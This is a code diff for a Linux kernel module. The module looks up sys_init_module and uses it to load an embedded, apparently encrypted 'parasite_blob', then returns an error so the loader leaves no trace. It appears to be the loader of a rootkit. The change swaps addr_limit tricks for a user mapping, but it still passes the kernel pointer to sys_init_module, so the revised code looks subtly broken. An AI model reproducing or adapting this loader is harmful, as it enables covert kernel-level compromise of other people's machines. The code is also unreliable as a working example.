@@ -3,16 +3,7 @@
 #include <linux/uaccess.h>
 #include <linux/kallsyms.h>
 #include <linux/version.h>
-
-#ifndef user_addr_max
-	#if LINUX_VERSION_CODE < KERNEL_VERSION(4,8,0)
-		# define user_addr_max()      (current_thread_info()->addr_limit.seg)
-	#else
-		# define user_addr_max() (current->thread.addr_limit.seg)
-	#endif
-#endif
-
-
+#include <linux/mman.h>
 
 #include "encrypt/encrypt.h"
 
@@ -46,14 +37,15 @@ int init_module(void)
 
 	sys_init_module = (void *)ksym_lookup_name("sys_init_module");
 	if (sys_init_module) {
+		const size_t len = roundup(sizeof(parasite_blob), PAGE_SIZE);
 		const char *nullarg = parasite_blob;
-		unsigned long seg = user_addr_max();
-
-		while (*nullarg) nullarg++;
-
-		user_addr_max() = roundup((unsigned long)parasite_blob + sizeof(parasite_blob), PAGE_SIZE);
-		sys_init_module(parasite_blob, sizeof(parasite_blob), nullarg);
-		user_addr_max() = seg;
+		void *map = (void *)vm_mmap(NULL, 0, len, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0);
+		if (map) {
+			while (*nullarg) nullarg++;
+			copy_to_user(map, parasite_blob, sizeof(parasite_blob));
+			sys_init_module(parasite_blob, sizeof(parasite_blob), nullarg);
+			vm_munmap((unsigned long)map, len);
+		}
 	}
 
 	return -EINVAL;
